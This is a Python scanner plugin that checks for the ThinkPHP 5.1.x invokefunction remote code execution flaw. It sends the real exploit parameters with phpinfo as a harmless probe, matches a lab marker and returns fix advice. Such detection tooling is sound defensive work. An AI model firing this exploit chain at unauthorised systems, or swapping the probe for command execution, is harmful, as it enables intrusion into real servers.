# ThinkPHP 5.1.x 路由调度 invokefunction 远程代码执行
# 漏洞原因：5.1.x 路由调度链 think\app::invokefunction 可被外部调用，
#           经 function=call_user_func_array + vars 传参执行任意函数（影响 5.1.x 多版本）。
# 本插件仅做存在性验证：以 phpinfo 作为探针函数，检测响应特征判定接口是否可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/thinkphp_server.py vuln 模式一致）
DISPATCH_RCE_MARKER = 'thinkphp-dispatch-rce-confirmed'


class ThinkphpDispatchRcePlugin(PluginBase):
    name = 'ThinkPHP 5.1.x 路由调度远程代码执行'
    cve = 'CNVD-2018-24943'
    severity = 'high'
    category = 'vuln'
    description = '5.1.x 路由调度链 think\\app/invokefunction 经 call_user_func_array 执行任意函数'
    fix = '升级 ThinkPHP 至官方修复版本；禁用 invokefunction 调用；对路由参数做白名单校验'

    def verify(self, target, session):
        url = join_url(target, '/')
        # 真实利用链参数（探针仅触发 phpinfo，不执行破坏性命令）
        params = {
            's': 'index/think\\app/invokefunction',
            'function': 'call_user_func_array',
            'vars[0]': 'phpinfo',
            'vars[1][]': '1',
        }
        try:
            resp = session.get(url, params=params)
        except Exception as e:
            print(no('ThinkPHP 5.1.x 路由调度 RCE（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if DISPATCH_RCE_MARKER in text:
            print(ok('存在 ThinkPHP 5.1.x 路由调度远程代码执行漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含路由调度 RCE 特征：{DISPATCH_RCE_MARKER}',
                fix=self.fix,
            )
        print(no('不存在 ThinkPHP 5.1.x 路由调度远程代码执行漏洞'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含路由调度 RCE 特征（可能已修复或接口不可达）')
